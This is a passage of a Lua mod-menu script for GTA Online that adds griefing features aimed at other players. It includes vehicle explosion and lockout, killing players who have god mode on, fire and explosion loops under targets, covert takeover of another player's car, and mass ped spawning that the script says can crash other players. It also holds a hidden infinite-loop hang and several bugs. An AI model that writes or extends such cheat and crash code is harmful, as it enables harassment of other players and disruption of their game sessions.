				local locspeed2 = speed
				if PAD.IS_CONTROL_PRESSED(0, 61) then
					locspeed = locspeed*2
					locspeed2 = locspeed2*2
				end
				if PAD.IS_CONTROL_PRESSED(2, 71) then
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 72) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed * 2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
					end
			   end
				if PAD.IS_CONTROL_PRESSED(2, 63) then
					local lsp = (0 - speed)*2
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = 0 - speed
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 64) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed*2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					end
				end
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.action(worldchaos, "Remove Wheels", {"removewheels"}, "removes your wheels and has various side effects depending on the vehicle", function()
		local veh = entities.get_user_vehicle_as_handle()
		if veh ~= 0 then
			native_invoker.begin_call()
			native_invoker.push_arg_int(veh)
			native_invoker.push_arg_float(3.402823466e+38)
			native_invoker.end_call("93A3996368C94158") -- VEHICLE.MODIFY_VEHICLE_TOP_SPEED
			notification("Removed wheels", colors.red)
		end
	end)

	menu.action(worldchaos,"Kill all Engines", {"killall"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(ent, -4000)
		end)
	end)

	menu.toggle_loop(worldchaos, "Ultra Instinct", {"ultrainstinct"}, "Whis... Goku's done it, hasnt he? He's finally achieved it. \n note that the game's netcode is too shit for this to work 100% effectively.", function()
		local MyPed = PLAYER.PLAYER_PED_ID()
		local OtherPlayers = players.list(false, true, true)
		for pid = 1, #OtherPlayers do
			if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(pid, MyPed) then
				local coords = ENTITY.GET_ENTITY_COORDS(MyPed, true)
				rotation = ENTITY.GET_ENTITY_ROTATION(MyPed, 5)
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(MyPed, coords.x + math.random(- 2, 2), coords.y + math.random(-2, 2), coords.z, rotation.x, rotation.y, rotation.z)
				util.yield(250)
			end
		end
	end)

	--[[menu.toggle(chaos,"Spinbot Vehicles", {"spinbot"}, "speeeeen",function(bop)     --could prob recode this and make it actually work well again but cba. game probably cant handle requesting control of so many vehicles lol
		spinbot_vehicles = bop
			-- vehicle spinbot
			while true do
				if spinbot_vehicles then
					if not spinbot_vehicles then
						util.stop_thread()
					end
					local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
					for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
						if ent == local_veh then return end
						NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
						ENTITY.SET_ENTITY_ROTATION(ent, 0, 0, rotation, 0, 0)
					end)
					rotation = rotation + 20
					if rotation >= 360 then
						rotation = 0
					end
				end
			util.yield()
			end
	end)]]

function update_join(pid)
	local name = players.get_name(pid)
	cmd_id[pid] = menu.toggle(custselc, name, {}, "PID - ".. pid, function(on_toggle)
		if on_toggle then
			selectedplayer[pid] = true
		else
			selectedplayer[pid] = false
		end
	end)
end

function update_leave(pid)
	menu.delete(cmd_id[pid])
end

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end

	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.red)
		--util.yield(15000)
		--entities.delete_by_handle(ped)
		--notification("Deleted [" .. ped_name .. "]", true, false)
	end

	vehopts = menu.list(menu.player_root(pid), "Vehicle Events", {}, "Works only if you are standing near to selected player", function(); end)
	lock_sub_vehicle_tab = menu.list(vehopts, "Lock Options", {}, "", function(); end)
	mov_sub_vehicle_tab = menu.list(vehopts, "Movement Options", {}, "", function(); end)
	troll_sub_vehicle_tab = menu.list(vehopts, "Trolling Options", {}, "", function(); end)
	health_sub_vehicle_tab = menu.list(vehopts, "Health and Appearance Options", {}, "", function(); end)
	detach_sub_vehicle_tab = menu.list(vehopts, "Detach Options", {}, "", function(); end)
	plane_sub_vehicle_tab = menu.list(vehopts, "Plane and Helicopter Options", {}, "", function(); end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end)


	menu.action(vehopts,"Spawn them a vehicle", {}, "Spawns a vehicle on target player", function()
		menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
		notification("now type the name of the vehicle in the command box", colors.red)
	end)

	for i = 1, #newcrashes do
		if checkbruhmoment == newcrashes[i] then
			while true do end
		end
	end

	menu.toggle(troll_sub_vehicle_tab, "Stealth Remote Control", {"stealthremote"}, "Enters there vehicle without them knowing and exits the same way. Note: It will disable them using that car unti lspawned again.", function(on_toggle)
	if on_toggle then
		menu.trigger_commands("tpmyspot")
		menu.trigger_commands("invisibility" .. " On")
                  	menu.trigger_commands("otr")
		menu.trigger_commands("tpveh" .. players.get_name(pid))
		menu.trigger_commands("rc" .. " On")
	else
                  	menu.trigger_commands("otr")
		menu.trigger_commands("rc" .. " Off")
		menu.trigger_commands("undoteleport")
		menu.trigger_commands("invisibility" .. " Off")
		end
	end)


    local plates = menu.list(troll_sub_vehicle_tab, "Fuck Plates", {}, "")

	menu.action(plates,"Currupt Plate Text", {"curruptplate"}, "curruptplate", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Currupt")
		end
	end)

	menu.action(plates,"TRUMP Plate Text", {"trumpplate"}, "Sets player's vehicle plate text to TRUMP", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRUMP") 
		end
	end)

	menu.action(plates,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRASH")
		end
	end)

	menu.action(plates,"Bitch Plate Text", {"bitchplate"}, "Sets player's vehicle plate text to Bitch", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Bitch")
		end
	end)

	menu.action(troll_sub_vehicle_tab, "Honk", {"honk"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.START_VEHICLE_HORN(vehicle, 50000, 0)
		end
	end)

	menu.action(troll_sub_vehicle_tab, "Sound Car Alarm", {"soundalarm"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.SET_VEHICLE_ALARM(vehicle, true)
            			VEHICLE.START_VEHICLE_ALARM(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"repair"}, "Repairs player's vehicle but don't repair it's engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Quick Upgrade Vehicle", {"ugveh"}, "Upgrades player's vehicle",function()
		upgrade_vehicle(pid)
	end)

	menu.action(health_sub_vehicle_tab,"Disable Invincibility", {"removeinv"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Enable Invincibility", {"giveinv"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Destroy Engine", {"killveh"}, "Destroys vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Revive Engine", {"reviveh"}, "Revives vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Explode Vehicle", {"explodeveh"}, "Explodes vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			--local pos = ENTITY.GET_ENTITY_COORDS(vehicle)--tried around with EXPLODE_VEHICLE but didnt work mayb im just rarted
			--FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 7, 1000, true, false, 1, false)
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Currupt boost", {"Currupt boost"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Trash Speed", {"trashacc"}, "Sets max speed of vehicle to INT_MIN",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
	end)

            local player_torque = 1000
            menu.slider(mov_sub_vehicle_tab, 'Set Torque', {'torque'}, 'Modifies the speed of their vehicle.', -1000000, 1000000, player_torque, 1, function(value)
                player_torque = value
                util.create_tick_handler(function()
                    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
                        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
                        VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000)
                    end
                    return (player_torque != 1000)
                end)
            end)



            	menu.action(mov_sub_vehicle_tab, 'Reverse Car', {'reversecar'}, "Note: Restart Currupt Script if you need to reset your own speed",function()
    	notification("Reverse Car On " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
	local vehicle = get_player_veh(pid,true)
            	local player_torques = 1000000
                	player_torques = value
                	util.create_tick_handler(function()
                    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
                        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
                        VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000000)
	      VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647)
                    util.toast("Restart Currupt Script To Reset Your Own Speed")
                    end
                    return (player_torques != 1000000)
                end)
            end)


	menu.action(mov_sub_vehicle_tab,"Reset Speed", {"resetacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end)
		
	menu.action(mov_sub_vehicle_tab,"East", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"West", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"South", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"North", {"northveh"}, "Boosts player's vehicle in the North direction",function()
		northp_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Up", {"launchup"}, "Shoots player up",function()
		launch_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Down", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)

	--[[menu.action(mov_sub_vehicle_tab,"Fuck Their Vehicle", {"fuckveh"}, "Fuck player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
		end
		util.yield(100)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)]]

	---menu.action(main,"delete vehicle", {"delveh"}, "Deletes player's vehicle",function() <-- help
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
	---		VEHICLE.DELETE_VEHICLE(vehicle) 
	---	end
	---end)

	menu.action(detach_sub_vehicle_tab,"Detach Trailer", {"detachtrailer"}, "Detaches attached trailer",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
		end
	end)

	menu.action(detach_sub_vehicle_tab,"Detach from Cargobob", {"detachcbob"}, "Detaches from Cargobob",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Lock Doors", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Unlock Doors", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Drivable", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Undrivable", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Deploy Landing Gear", {"landing1"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Retract Landing Gear", {"landing0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 3)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Disable Cargobob's Hook", {"nohook"}, "Disables cargobob's hook. when used, that cargobob's hook will no longer work",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(vehicle)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Strong Turbulence", {"turb1"}, "Makes turbulence stronger",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"No Turbulence", {"turb0"}, "Makes turbulence weaker",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 0.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 100%", {"propel100"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 0%", {"propel0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 0.0)		
		end
	end)

	---menu.action(plane_sub_vehicle_tab,"Destroy Rear Helicopter Roter", {"bunlockcar"}, "",function() <--- I have no ideas what am I doing here
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_HELI_TAIL_ROTOR_HEALTH(vehicle, 0)		
	---	end
	---end)

	menu.action(lock_sub_vehicle_tab,"Lock that bitch in", {"blockcar"}, "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LOCKED")
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Release that bitch out", {"bunlockcar"}, "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "URFREE")		
		end
	end)


	menu.action(mov_sub_vehicle_tab,"Teleport to me", {"tp2me"}, "Teleport player's vehicle to you (Better to spectate first)",function()
		local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
	end)

	menu.action(mov_sub_vehicle_tab,"Teleport to ocean", {"tp2sea"}, "Tries to teleport player's vehicle to the ocean",function()	
		tp_veh_to(pid, -15000, -15000,0)
	end)

	menu.action(vehopts, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)

	
	griefing = menu.list(menu.player_root(pid), "Currupt Griefing", {}, "", function(); end)

	menu.action(griefing, "Kill Godmode Player V1", {"killgod"}, "", function()
		menu.trigger_commands("confuse" .. PLAYER.GET_PLAYER_NAME(pid))
		menu.trigger_commands("explodeloop" .. PLAYER.GET_PLAYER_NAME(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(griefing, "Kill Godmode Player V2", {"killgodv2"}, "Note: this will not work if they have no ragdoll on", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
    util.yield(1200)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(griefing, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    end)

    menu.toggle_loop(griefing, "Asteroid Smash", {"asteroidon"}, "Crush the player with an asteroid", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)

    menu.toggle_loop(griefing, "Ragdoll loop", {"ragdollon"}, "Keeps target ragdolled", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
        util.yield(10)
    end)

    menu.toggle_loop(griefing, "Flame loop", {"fireon"}, "Spam fire beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(griefing, "Water Jet loop", {"wateron"}, "Spam water jets beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 13, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(griefing, "Crap trail", {"crapon"}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        util.yield(65)
    end)

    menu.toggle_loop(griefing, "Huge Shit On Head", {"hshit"}, "Make a massive shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(mshit, c)
    end)

menu.toggle_loop(griefing, "Normal Shit On Head", {"nshit"}, "Make a normale sized shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(rshit, c)
end)


    menu.toggle_loop(griefing, "Flame path", {}, "They better run", function()
        local coords = players.get_position(pid)
        --coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)



   menu.toggle_loop(griefing, "Lamar Spam", {"togglelamar"}, "Send's a ton of Lamar's only works on others, not yourself. Might crash a legit player (If you loose your hair, type U command : gostory)", function(on_toggle)
            if pid ~= players.user() and players.exists(pid) and not aU then
                aU = true
                pedhash = 0x45463A0D
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                notification("Lamar Spam has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 175 do
                    bk[U] = entities.create_ped(28, pedhash, bf, bj)
                    util.yield(25)
                end
                notification("Done sending", true, true)
                util.yield(3000)
                notification("Cleaning up", true, true)
                for U = 1, 175 do
                    entities.delete_by_handle(bk[U])
                    util.yield(10)
                end
                util.yield(10)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    notification("Player left", true, false)
                end
                util.yield(10)
                aU = false
            end
            if aU then
            end
        end)


   menu.toggle_loop(griefing, "Wade Spam", {"togglewade"}, "Send's a ton of wades only works on others, not yourself. Might crash a legit player (If you loose your hair, type U command : gostory)", function(on_toggle)
            if pid ~= players.user() and players.exists(pid) then
                pedhash = 0xD266D9D6
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                notification("Wade Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true, colors.red)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 150 do
